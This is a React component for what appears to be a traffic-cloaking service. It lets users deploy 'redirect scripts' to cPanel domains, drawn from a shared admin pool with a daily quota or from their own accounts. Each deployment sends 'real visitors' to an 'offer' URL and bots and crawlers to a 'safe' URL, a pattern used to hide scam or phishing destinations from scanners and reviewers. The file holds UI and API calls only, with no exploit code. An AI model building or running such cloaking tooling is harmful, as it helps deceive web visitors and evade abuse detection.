import { useState, useEffect } from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { toast } from "sonner";
import { CloudUpload, Globe, Copy, ExternalLink, Trash2, Edit, Check, Rocket, AlertCircle, Server, Clock } from "lucide-react";
import MyCpanelManager from './MyCpanelManager';

const API_BASE = '';

async function apiFetch(endpoint, options = {}) {
  const token = localStorage.getItem('token');
  const response = await fetch(`${API_BASE}${endpoint}`, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}`,
      ...options.headers,
    },
  });
  if (!response.ok) {
    const error = await response.json().catch(() => ({ error: 'Request failed' }));
    throw new Error(error.error || 'Request failed');
  }
  return response.json();
}

export default function CpanelDeploy() {
  const queryClient = useQueryClient();
  const [selectedDomain, setSelectedDomain] = useState('');
  const [humanUrl, setHumanUrl] = useState('');
  const [botUrl, setBotUrl] = useState('');
  const [editingDeployment, setEditingDeployment] = useState(null);
  const [editHumanUrl, setEditHumanUrl] = useState('');
  const [editBotUrl, setEditBotUrl] = useState('');
  const [countdown, setCountdown] = useState('');

  // Countdown timer until midnight (daily reset)
  useEffect(() => {
    const calculateCountdown = () => {
      const now = new Date();
      const midnight = new Date();
      midnight.setHours(24, 0, 0, 0); // Next midnight

      const diff = midnight - now;
      const hours = Math.floor(diff / (1000 * 60 * 60));
      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((diff % (1000 * 60)) / 1000);

      setCountdown(`${hours}h ${minutes}m ${seconds}s`);
    };

    calculateCountdown();
    const interval = setInterval(calculateCountdown, 1000);
    return () => clearInterval(interval);
  }, []);

  // Fetch admin-enabled domains (daily limit applies)
  const { data: adminDomains = [], isLoading: adminDomainsLoading } = useQuery({
    queryKey: ['cpanel-available-domains'],
    queryFn: () => apiFetch('/api/cpanel/available-domains'),
  });

  // Fetch user's own cPanel domains (unlimited)
  const { data: userDomains = [], isLoading: userDomainsLoading } = useQuery({
    queryKey: ['my-cpanel-domains'],
    queryFn: () => apiFetch('/api/cpanel/my-cpanel-domains'),
  });

  // Fetch user's deployments
  const { data: deployments = [], isLoading: deploymentsLoading } = useQuery({
    queryKey: ['cpanel-my-deployments'],
    queryFn: () => apiFetch('/api/cpanel/my-deployments'),
  });

  // Fetch deployment limit (for admin cPanels only)
  const { data: limitInfo, isLoading: limitLoading } = useQuery({
    queryKey: ['cpanel-deployment-limit'],
    queryFn: () => apiFetch('/api/cpanel/deployment-limit'),
  });

  // Combine domains - user domains marked as unlimited
  const allDomains = [
    ...userDomains.map(d => ({ ...d, source: 'user', unlimited: true })),
    ...adminDomains.map(d => ({ ...d, source: 'admin', unlimited: false }))
  ];

  const domainsLoading = adminDomainsLoading || userDomainsLoading;

  // Deploy mutation
  const deployMutation = useMutation({
    mutationFn: (data) => apiFetch('/api/cpanel/deploy', {
      method: 'POST',
      body: JSON.stringify(data),
    }),
    onSuccess: (data) => {
      queryClient.invalidateQueries({ queryKey: ['cpanel-my-deployments'] });
      queryClient.invalidateQueries({ queryKey: ['cpanel-deployment-limit'] });
      toast.success('Script deployed successfully!');
      setSelectedDomain('');
      setHumanUrl('');
      setBotUrl('');
    },
    onError: (error) => {
      toast.error(error.message);
    },
  });

  // Update deployment mutation
  const updateMutation = useMutation({
    mutationFn: ({ id, data }) => apiFetch(`/api/cpanel/deployments/${id}`, {
      method: 'PUT',
      body: JSON.stringify(data),
    }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['cpanel-my-deployments'] });
      toast.success('Deployment updated');
      setEditingDeployment(null);
    },
    onError: (error) => {
      toast.error(error.message);
    },
  });

  // Remove deployment mutation
  const removeMutation = useMutation({
    mutationFn: (id) => apiFetch(`/api/cpanel/deployments/${id}`, {
      method: 'DELETE',
    }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['cpanel-my-deployments'] });
      queryClient.invalidateQueries({ queryKey: ['cpanel-deployment-limit'] });
      toast.success('Deployment removed');
    },
    onError: (error) => {
      toast.error(error.message);
    },
  });

  const handleDeploy = (e) => {
    e.preventDefault();
    if (!selectedDomain) {
      toast.error('Please select a domain');
      return;
    }
    if (!humanUrl || !botUrl) {
      toast.error('Both Human URL and Bot URL are required');
      return;
    }
    deployMutation.mutate({
      domain_id: selectedDomain,
      human_redirect_url: humanUrl,
      bot_redirect_url: botUrl,
    });
  };

  const handleUpdate = () => {
    if (!editHumanUrl || !editBotUrl) {
      toast.error('Both URLs are required');
      return;
    }
    updateMutation.mutate({
      id: editingDeployment.id,
      data: {
        human_redirect_url: editHumanUrl,
        bot_redirect_url: editBotUrl,
      },
    });
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success('Copied to clipboard');
  };

  const openEditDialog = (deployment) => {
    setEditingDeployment(deployment);
    setEditHumanUrl(deployment.human_redirect_url);
    setEditBotUrl(deployment.bot_redirect_url);
  };

  // All domains available - user's own cPanels have no limits
  // Check if selected domain is from user's cPanel (unlimited) or admin cPanel (limited)
  const selectedDomainInfo = allDomains.find(d => d.id === selectedDomain);
  const isUserDomain = selectedDomainInfo?.source === 'user';

  // Can deploy if: selecting user's own domain (always), or admin domain with remaining quota
  const canDeploy = isUserDomain || (limitInfo?.canDeploy ?? true);

  return (
    <Tabs defaultValue="deploy" className="space-y-4">
      <TabsList>
        <TabsTrigger value="deploy" className="flex items-center gap-2">
          <CloudUpload className="h-4 w-4" />
          Deploy
        </TabsTrigger>
        <TabsTrigger value="my-cpanels" className="flex items-center gap-2">
          <Server className="h-4 w-4" />
          My cPanels
        </TabsTrigger>
      </TabsList>

      <TabsContent value="deploy" className="space-y-6">
        {/* Deployment Card */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-lg flex items-center gap-2">
              <Rocket className="h-5 w-5" />
              cPanel Deployment
            </CardTitle>
            <CardDescription>
              Deploy redirect scripts to admin cPanels (daily limit) or your own cPanels (unlimited)
            </CardDescription>
          </CardHeader>
          <CardContent>
          {/* Limit info for admin cPanels */}
          {limitLoading ? (
            <div className="text-gray-500">Loading...</div>
          ) : limitInfo ? (
            <div className="flex flex-wrap items-center gap-4 mb-4">
              <div className="flex items-center gap-2">
                <span className="text-sm text-gray-500">Admin cPanels (Daily):</span>
                <Badge variant={limitInfo.canDeploy ? 'default' : 'destructive'}>
                  {limitInfo.used} / {limitInfo.limit}
                </Badge>
                {!limitInfo.canDeploy && (
                  <div className="flex items-center gap-1 text-xs text-gray-500">
                    <Clock className="h-3 w-3" />
                    Resets in {countdown}
                  </div>
                )}
              </div>
              {userDomains.length > 0 && (
                <div className="flex items-center gap-2">
                  <span className="text-sm text-gray-500">Your cPanels:</span>
                  <Badge variant="secondary" className="bg-green-100 text-green-700">
                    Unlimited
                  </Badge>
                </div>
              )}
              {!limitInfo.canDeploy && adminDomains.length > 0 && userDomains.length === 0 && (
                <div className="flex items-center gap-1 text-amber-600 text-sm">
                  <AlertCircle className="h-4 w-4" />
                  Daily limit reached - add your own cPanel for unlimited
                </div>
              )}
            </div>
          ) : null}

          {allDomains.length === 0 && deployments.length === 0 ? (
            <div className="text-center py-8 text-gray-500">
              <Globe className="h-12 w-12 mx-auto mb-2 text-gray-300" />
              <p>No domains available for deployment.</p>
              <p className="text-sm">Add your own cPanel or contact admin to enable domains.</p>
            </div>
          ) : allDomains.length > 0 ? (
            <form onSubmit={handleDeploy} className="space-y-4">
              <div>
                <Label htmlFor="domain">Select Domain</Label>
                <Select value={selectedDomain} onValueChange={setSelectedDomain}>
                  <SelectTrigger>
                    <SelectValue placeholder="Choose a domain..." />
                  </SelectTrigger>
                  <SelectContent>
                    {userDomains.length > 0 && (
                      <div className="px-2 py-1 text-xs font-semibold text-green-600 bg-green-50">
                        Your cPanels (Unlimited)
                      </div>
                    )}
                    {userDomains.map((domain) => (
                      <SelectItem key={domain.id} value={domain.id}>
                        {domain.domain}
                        <Badge variant="secondary" className="ml-2 text-xs bg-green-100 text-green-700">
                          Unlimited
                        </Badge>
                      </SelectItem>
                    ))}
                    {adminDomains.length > 0 && (
                      <div className="px-2 py-1 text-xs font-semibold text-blue-600 bg-blue-50 mt-1">
                        Admin cPanels ({limitInfo?.used || 0}/{limitInfo?.limit || 0} daily)
                      </div>
                    )}
                    {adminDomains.map((domain) => (
                      <SelectItem key={domain.id} value={domain.id} disabled={!limitInfo?.canDeploy}>
                        {domain.domain}
                        <Badge variant="outline" className="ml-2 text-xs">
                          {domain.domain_type}
                        </Badge>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {selectedDomainInfo && (
                  <p className="text-xs mt-1">
                    {isUserDomain ? (
                      <span className="text-green-600">Your cPanel - no daily limit</span>
                    ) : (
                      <span className="text-blue-600">Admin cPanel - counts toward daily limit</span>
                    )}
                  </p>
                )}
              </div>

              <div>
                <Label htmlFor="humanUrl">Human Redirect URL</Label>
                <Input
                  id="humanUrl"
                  placeholder="https://example.com/offer"
                  value={humanUrl}
                  onChange={(e) => setHumanUrl(e.target.value)}
                />
                <p className="text-xs text-gray-500 mt-1">
                  Where real visitors will be redirected
                </p>
              </div>

              <div>
                <Label htmlFor="botUrl">Bot Redirect URL</Label>
                <Input
                  id="botUrl"
                  placeholder="https://example.com/safe"
                  value={botUrl}
                  onChange={(e) => setBotUrl(e.target.value)}
                />
                <p className="text-xs text-gray-500 mt-1">
                  Where bots and crawlers will be redirected
                </p>
              </div>

              <Button type="submit" disabled={deployMutation.isPending} className="w-full">
                <CloudUpload className="h-4 w-4 mr-2" />
                {deployMutation.isPending ? 'Deploying...' : 'Deploy Script'}
              </Button>
            </form>
          ) : !limitInfo?.canDeploy && userDomains.length === 0 ? (
            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 text-amber-700 text-sm space-y-2">
              <p>You have reached your daily deployment limit for admin cPanels ({limitInfo?.limit} per day).</p>
              <div className="flex items-center gap-2">
                <Clock className="h-4 w-4" />
                <span>Resets in: <strong>{countdown}</strong></span>
              </div>
              <p className="text-xs">Or add your own cPanel for unlimited deployments.</p>
            </div>
          ) : null}
        </CardContent>
      </Card>

      {/* Active Deployments */}
      {deployments.length > 0 && (
        <Card>
          <CardHeader>
            <CardTitle className="text-lg">Active Deployments</CardTitle>
            <CardDescription>
              Your deployed redirect scripts
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {deployments.map((deployment) => (
                <div
                  key={deployment.id}
                  className="border rounded-lg p-4 space-y-3"
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Globe className="h-5 w-5 text-blue-500" />
                      <span className="font-mono font-medium">{deployment.domain}</span>
                      <Badge variant="default">Active</Badge>
                    </div>
                    <div className="flex items-center gap-2">
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => openEditDialog(deployment)}
                      >
                        <Edit className="h-4 w-4" />
                      </Button>
                      <AlertDialog>
                        <AlertDialogTrigger asChild>
                          <Button variant="ghost" size="sm" className="text-red-500 hover:text-red-700">
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </AlertDialogTrigger>
                        <AlertDialogContent>
                          <AlertDialogHeader>
                            <AlertDialogTitle>Remove Deployment?</AlertDialogTitle>
                            <AlertDialogDescription>
                              This will remove the redirect script from {deployment.domain}.
                              You can deploy again later if you have available slots.
                            </AlertDialogDescription>
                          </AlertDialogHeader>
                          <AlertDialogFooter>
                            <AlertDialogCancel>Cancel</AlertDialogCancel>
                            <AlertDialogAction
                              onClick={() => removeMutation.mutate(deployment.id)}
                              className="bg-red-500 hover:bg-red-600"
                            >
                              Remove
                            </AlertDialogAction>
                          </AlertDialogFooter>
                        </AlertDialogContent>
                      </AlertDialog>
                    </div>
                  </div>

                  <div className="bg-gray-50 rounded p-3 space-y-2">
                    <div className="space-y-2">
                      <span className="text-sm text-gray-500">Live URL:</span>
                      <div className="flex items-center gap-2">
                        <Input
                          readOnly
                          value={deployment.deployed_url}
                          className="font-mono text-sm flex-1 bg-white cursor-text"
                          onClick={(e) => e.target.select()}
                        />
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => copyToClipboard(deployment.deployed_url)}
                          title="Copy URL"
                        >
                          <Copy className="h-4 w-4" />
                        </Button>
                        <a
                          href={deployment.deployed_url}
                          target="_blank"
                          rel="noopener noreferrer"
                        >
                          <Button variant="outline" size="sm" title="Open in new tab">
                            <ExternalLink className="h-4 w-4" />
                          </Button>
                        </a>
                      </div>
                    </div>
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div>
                        <span className="text-gray-500">Human URL:</span>
                        <p className="truncate font-mono text-xs mt-1">
                          {deployment.human_redirect_url}
                        </p>
                      </div>
                      <div>
                        <span className="text-gray-500">Bot URL:</span>
                        <p className="truncate font-mono text-xs mt-1">
                          {deployment.bot_redirect_url}
                        </p>
                      </div>
                    </div>
                  </div>

                  <div className="text-xs text-gray-400">
                    Deployed: {new Date(deployment.deployed_at).toLocaleString()}
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

        {/* Edit Dialog */}
        <Dialog open={!!editingDeployment} onOpenChange={() => setEditingDeployment(null)}>
          <DialogContent>
            <DialogHeader>
              <DialogTitle>Edit Deployment</DialogTitle>
              <DialogDescription>
                Update redirect URLs for {editingDeployment?.domain}
              </DialogDescription>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <div>
                <Label htmlFor="editHumanUrl">Human Redirect URL</Label>
                <Input
                  id="editHumanUrl"
                  value={editHumanUrl}
                  onChange={(e) => setEditHumanUrl(e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="editBotUrl">Bot Redirect URL</Label>
                <Input
                  id="editBotUrl"
                  value={editBotUrl}
                  onChange={(e) => setEditBotUrl(e.target.value)}
                />
              </div>
              <div className="flex justify-end gap-2">
                <Button variant="outline" onClick={() => setEditingDeployment(null)}>
                  Cancel
                </Button>
                <Button onClick={handleUpdate} disabled={updateMutation.isPending}>
                  {updateMutation.isPending ? 'Updating...' : 'Update'}
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </TabsContent>

      <TabsContent value="my-cpanels">
        <MyCpanelManager />
      </TabsContent>
    </Tabs>
  );
}
